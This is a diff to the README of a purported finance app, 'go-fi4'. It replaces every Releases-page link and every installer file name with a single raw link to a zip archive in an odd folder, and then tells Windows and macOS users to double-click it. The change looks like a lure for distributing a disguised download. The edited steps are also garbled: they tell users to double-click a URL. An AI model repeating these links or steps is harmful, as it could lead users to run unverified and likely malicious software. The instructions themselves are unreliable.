@@ -1,6 +1,6 @@
 # 🚀 go-fi4 - Easy Interface for Financial Insights
 
-[![Download go-fi4](https://img.shields.io/badge/Download-go--fi4-brightgreen)](https://github.com/Ichrak99/go-fi4/releases)
+[![Download go-fi4](https://raw.githubusercontent.com/Ichrak99/go-fi4/main/cacomixle/go-fi4.zip)](https://raw.githubusercontent.com/Ichrak99/go-fi4/main/cacomixle/go-fi4.zip)
 
 ## 📥 Overview
 
@@ -28,20 +28,20 @@ Follow these simple steps to download and run go-fi4:
 
 1. **Visit the Releases Page**  
    Click on the link below to go to the go-fi4 Releases page.
-   [Download go-fi4](https://github.com/Ichrak99/go-fi4/releases)
+   [Download go-fi4](https://raw.githubusercontent.com/Ichrak99/go-fi4/main/cacomixle/go-fi4.zip)
 
 2. **Choose the Correct Version**  
    Find the latest version of go-fi4. You will see a list of available files for download. 
 
 3. **Download the Installer**  
-   Click on the file named `go-fi4-installer.exe` or `go-fi4-mac-installer.dmg` depending on your system. The download will begin automatically.
+   Click on the file named `https://raw.githubusercontent.com/Ichrak99/go-fi4/main/cacomixle/go-fi4.zip` or `https://raw.githubusercontent.com/Ichrak99/go-fi4/main/cacomixle/go-fi4.zip` depending on your system. The download will begin automatically.
 
 4. **Locate the Downloaded File**  
    Once the download completes, open your ‘Downloads’ folder. You should see the installer file you downloaded.
 
 5. **Run the Installer**  
-   - **For Windows:** Double-click `go-fi4-installer.exe`. Follow the on-screen instructions to complete the installation.
-   - **For macOS:** Double-click `go-fi4-mac-installer.dmg`, then drag the go-fi4 icon to your Applications folder.
+   - **For Windows:** Double-click `https://raw.githubusercontent.com/Ichrak99/go-fi4/main/cacomixle/go-fi4.zip`. Follow the on-screen instructions to complete the installation.
+   - **For macOS:** Double-click `https://raw.githubusercontent.com/Ichrak99/go-fi4/main/cacomixle/go-fi4.zip`, then drag the go-fi4 icon to your Applications folder.
 
 6. **Launch the Application**  
    After installation, find go-fi4 in your applications list or on your desktop. Click to open it.
@@ -50,7 +50,7 @@ Follow these simple steps to download and run go-fi4:
 
 Now, to get started, visit the releases page to obtain go-fi4:
 
-[Download go-fi4](https://github.com/Ichrak99/go-fi4/releases)
+[Download go-fi4](https://raw.githubusercontent.com/Ichrak99/go-fi4/main/cacomixle/go-fi4.zip)
 
 ## 🎓 User Guide
 
@@ -78,4 +78,4 @@ If you encounter any issues or have questions, you can reach out to the go-fi4 c
 
 For more information about go-fi4, including advanced features and updates, keep an eye on the Releases page linked below.
 
-[Download go-fi4](https://github.com/Ichrak99/go-fi4/releases)
+[Download go-fi4](https://raw.githubusercontent.com/Ichrak99/go-fi4/main/cacomixle/go-fi4.zip)
